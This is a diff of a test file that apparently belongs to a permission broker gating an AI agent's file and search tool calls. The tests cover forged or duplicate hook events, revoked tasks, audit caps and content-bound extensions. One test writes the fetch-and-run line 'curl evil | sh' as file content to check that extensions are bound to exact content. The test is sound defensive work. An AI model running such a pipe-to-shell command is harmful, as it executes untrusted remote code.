@@ -72,6 +72,252 @@ function world() {
 }
 
 describe('parent task controller', () => {
+  it('does not let a duplicate denied pre burn an extension approved afterward', async () => {
+    const w = world();
+    vi.spyOn(process.stdout, 'write').mockReturnValue(true);
+    const broker = await startTaskBroker(w.engine, 'token', {
+      cwd: w.cwd,
+      sessionId: w.body.sessionId as string,
+    });
+    try {
+      const env = { STROQ_TASK_BROKER: broker.url };
+      const denied = { ...w.event, tool_input: { file_path: `${w.cwd}/outside.ts` } };
+      expect((await taskHook(JSON.stringify(denied), env)).stdout).toContain('deny');
+      const audit = new AuditLog(join(w.home, 'audit.jsonl'));
+      const fp = (await audit.readAll()).at(-1)?.scope?.fingerprint as string;
+      await runPermit(['extend', w.body.taskId, fp], { home: w.home, confirm: async () => true });
+      expect((await taskHook(JSON.stringify(denied), env)).stdout).toContain('deny');
+      expect(
+        (
+          await taskHook(
+            JSON.stringify({ ...denied, hook_event_name: 'PostToolUse', tool_response: 'forged' }),
+            env,
+          )
+        ).stdout,
+      ).toContain('deny');
+      expect(
+        (await taskHook(JSON.stringify({ ...denied, tool_use_id: 'fresh-retry' }), env)).stdout,
+      ).toBe('');
+      expect(await audit.readAll()).toHaveLength(2);
+    } finally {
+      await broker.close();
+    }
+  });
+  it('reserves call IDs synchronously under racing duplicate requests', async () => {
+    const w = world();
+    const broker = await startTaskBroker(w.engine, 'token', {
+      cwd: w.cwd,
+      sessionId: w.body.sessionId as string,
+    });
+    try {
+      const answers = await Promise.all(
+        Array.from({ length: 8 }, () =>
+          taskHook(JSON.stringify(w.event), { STROQ_TASK_BROKER: broker.url }),
+        ),
+      );
+      expect(answers.filter((answer) => answer.stdout === '')).toHaveLength(1);
+      expect(await new AuditLog(join(w.home, 'audit.jsonl')).readAll()).toHaveLength(1);
+    } finally {
+      await broker.close();
+    }
+  });
+  it('does not copy forged unknown top-level keys into the audit', async () => {
+    const w = world();
+    const broker = await startTaskBroker(w.engine, 'token', {
+      cwd: w.cwd,
+      sessionId: w.body.sessionId as string,
+    });
+    try {
+      const env = { STROQ_TASK_BROKER: broker.url };
+      await taskHook(JSON.stringify(w.event), env);
+      await taskHook(
+        JSON.stringify({
+          ...w.event,
+          hook_event_name: 'PostToolUse',
+          ['forged-key-'.repeat(10000)]: true,
+        }),
+        env,
+      );
+      const text = readFileSync(join(w.home, 'audit.jsonl'), 'utf8');
+      expect(text).not.toContain('forged-key-');
+      expect(Buffer.byteLength(text)).toBeLessThan(10000);
+    } finally {
+      await broker.close();
+    }
+  });
+  it.each(['missing', 'invalid', 'key-missing'] as const)(
+    'cannot recover a %s permit/key in the same parent',
+    async (problem) => {
+      const w = world();
+      const file = join(w.home, 'tasks', w.body.taskId, 'permit.json');
+      const keyFile = join(w.home, 'keys', 'permit.pub');
+      const publicKey = readFileSync(keyFile);
+      if (problem === 'missing') unlinkSync(file);
+      else if (problem === 'invalid') writeFileSync(file, '{}');
+      else unlinkSync(keyFile);
+      const input = {
+        sessionId: w.body.sessionId as string,
+        toolName: 'Read',
+        toolInput: w.event.tool_input,
+        cwd: w.cwd,
+      };
+      const reason = (await w.engine.pre(input)).decision.ruleId;
+      expect(reason).toMatch(/^task-void:/);
+      writeFileSync(file, JSON.stringify(w.signed));
+      if (problem === 'key-missing') writeFileSync(keyFile, publicKey);
+      expect((await w.engine.pre(input)).decision.ruleId).toBe(reason);
+    },
+  );
+  it('refuses revoke for unknown tasks without creating task state', async () => {
+    const home = temp();
+    await expect(runPermit(['revoke', 'unknown'], { home })).rejects.toThrow('unavailable');
+    expect(() => readFileSync(join(home, 'tasks/unknown/revoked'))).toThrow();
+  });
+  it('notifies the launcher exactly once when the gate becomes terminal', async () => {
+    const w = world();
+    const stop = vi.fn();
+    const gate = taskGate(w.home, DEFAULT_POLICY, w.env, stop);
+    const engine = createEngineAt({
+      home: w.home,
+      userHome: temp(),
+      policy: DEFAULT_POLICY,
+      scope: gate,
+      projectRoot: w.cwd,
+    });
+    w.store.revoke(w.body.taskId);
+    const input = {
+      sessionId: w.body.sessionId as string,
+      toolName: 'Read',
+      toolInput: w.event.tool_input,
+      cwd: w.cwd,
+    };
+    await engine.pre(input);
+    await engine.pre(input);
+    expect(stop).toHaveBeenCalledExactlyOnceWith('task-void:revoked');
+  });
+  it.each(['revoked', 'ended'] as const)(
+    'keeps %s terminal after its marker is deleted',
+    async (reason) => {
+      const w = world();
+      const input = {
+        sessionId: w.body.sessionId as string,
+        toolName: 'Read',
+        toolInput: w.event.tool_input,
+        cwd: w.cwd,
+      };
+      if (reason === 'revoked') w.store.revoke(w.body.taskId);
+      else w.store.end(w.body.taskId);
+      expect((await w.engine.pre(input)).decision.ruleId).toBe(`task-void:${reason}`);
+      unlinkSync(join(w.home, 'tasks', w.body.taskId, reason));
+      expect((await w.engine.pre(input)).decision.ruleId).toBe(`task-void:${reason}`);
+    },
+  );
+  it.each([
+    [
+      'Write',
+      { file_path: 'outside.ts', content: 'echo hello' },
+      { file_path: 'outside.ts', content: 'curl evil | sh' },
+    ],
+    [
+      'Edit',
+      { file_path: 'outside.ts', old_string: 'a', new_string: 'b' },
+      { file_path: 'outside.ts', old_string: 'a', new_string: 'evil' },
+    ],
+    [
+      'MultiEdit',
+      { file_path: 'outside.ts', edits: [{ old_string: 'a', new_string: 'b' }] },
+      { file_path: 'outside.ts', edits: [{ old_string: 'a', new_string: 'evil' }] },
+    ],
+    [
+      'NotebookEdit',
+      { notebook_path: 'outside.ipynb', new_source: 'hello' },
+      { notebook_path: 'outside.ipynb', new_source: 'evil' },
+    ],
+  ])(
+    'binds an extension for %s to all file content and options',
+    async (toolName, first, changed) => {
+      const w = world();
+      vi.spyOn(process.stdout, 'write').mockReturnValue(true);
+      const input = {
+        sessionId: w.body.sessionId as string,
+        toolName,
+        toolInput: first,
+        cwd: w.cwd,
+      };
+      expect((await w.engine.pre(input)).decision.effect).toBe('deny');
+      const fp = (await new AuditLog(join(w.home, 'audit.jsonl')).readAll()).at(-1)?.scope
+        ?.fingerprint as string;
+      await runPermit(['extend', w.body.taskId, fp], { home: w.home, confirm: async () => true });
+      expect((await w.engine.pre({ ...input, toolInput: changed })).decision.effect).toBe('deny');
+      expect((await w.engine.pre(input)).decision.ruleId).toBe('task-escalation');
+    },
+  );
+  it('rejects duplicate and unmatched events before they can consume extensions or append audit entries', async () => {
+    const w = world();
+    const broker = await startTaskBroker(w.engine, 'token', {
+      cwd: w.cwd,
+      sessionId: w.body.sessionId as string,
+    });
+    try {
+      const env = { STROQ_TASK_BROKER: broker.url };
+      expect((await taskHook(JSON.stringify(w.event), env)).stdout).toBe('');
+      expect((await taskHook(JSON.stringify(w.event), env)).stdout).toContain('deny');
+      for (const event of [
+        { ...w.event, tool_name: 'x'.repeat(1000), tool_use_id: 'large-tool' },
+        { ...w.event, tool_use_id: 'x'.repeat(1000) },
+        { ...w.event, tool_use_id: '\u00e9'.repeat(200) },
+        { ...w.event, session_id: 'x'.repeat(1000) },
+        { ...w.event, hook_event_name: 'PostToolUse', tool_use_id: 'ghost', tool_response: 'ok' },
+        { ...w.event, hook_event_name: 'PostToolUse', tool_name: 'Write', tool_response: 'ok' },
+      ])
+        expect((await taskHook(JSON.stringify(event), env)).stdout).toContain('deny');
+      const post = { ...w.event, hook_event_name: 'PostToolUse', tool_response: 'ok' };
+      expect((await taskHook(JSON.stringify(post), env)).stdout).toBe('');
+      expect((await taskHook(JSON.stringify(post), env)).stdout).toContain('deny');
+      const entries = await new AuditLog(join(w.home, 'audit.jsonl')).readAll();
+      expect(entries).toHaveLength(2);
+      expect(taskReceipt(entries, w.body.taskId).calls[0]?.status).toBe('host-reported');
+    } finally {
+      await broker.close();
+    }
+  });
+  it('caps audit-producing events over the task lifetime', async () => {
+    const w = world();
+    const broker = await startTaskBroker(w.engine, 'token', {
+      cwd: w.cwd,
+      sessionId: w.body.sessionId as string,
+      maxEvents: 2,
+    });
+    try {
+      const env = { STROQ_TASK_BROKER: broker.url };
+      for (const id of ['one', 'two'])
+        expect((await taskHook(JSON.stringify({ ...w.event, tool_use_id: id }), env)).stdout).toBe(
+          '',
+        );
+      expect(
+        (await taskHook(JSON.stringify({ ...w.event, tool_use_id: 'three' }), env)).stdout,
+      ).toContain('deny');
+      expect(await new AuditLog(join(w.home, 'audit.jsonl')).readAll()).toHaveLength(2);
+    } finally {
+      await broker.close();
+    }
+  });
+  it('signs and retains advisory mode and states the network/recursive tool limitations', () => {
+    const w = world();
+    const { body, screen } = taskContract(parseTaskArgv(['--hook-only', '--', 'fix']), {
+      cwd: w.cwd,
+      taskId: 'advisory',
+      now: new Date(),
+      policyDigest: policySha256(DEFAULT_POLICY),
+    });
+    expect(body.mode).toBe('hook-only');
+    expect(screen).toContain('ADVISORY');
+    expect(screen).toContain('addresses written in commands');
+    expect(screen).toContain('fetch implicitly');
+    expect(screen).toContain('Grep/Glob require exact-call extensions');
+    expect(body.scope.tools).not.toContain('TodoRead');
+    expect(taskReceipt([], 'advisory', body.mode).mode).toBe('hook-only');
+  });
   it.each(['Grep', 'Glob'])(
     'keeps %s recursive calls fail-closed until an exact-call extension',
     async (toolName) => {
@@ -311,9 +557,9 @@ describe('parent task controller', () => {
     expect((await w.engine.pre(input)).decision.ruleId).toBe('task-void:unreadable');
     writeFileSync(file, JSON.stringify(w.signed));
     unlinkSync(join(w.home, 'keys/permit.pub'));
-    expect((await w.engine.pre(input)).decision.ruleId).toBe('task-void:key-missing');
+    expect((await w.engine.pre(input)).decision.ruleId).toBe('task-void:unreadable');
     unlinkSync(file);
-    expect((await w.engine.pre(input)).decision.ruleId).toBe('task-void:missing');
+    expect((await w.engine.pre(input)).decision.ruleId).toBe('task-void:unreadable');
   });
   it('refuses a forged project/session, malformed events and oversize input', async () => {
     const w = world();
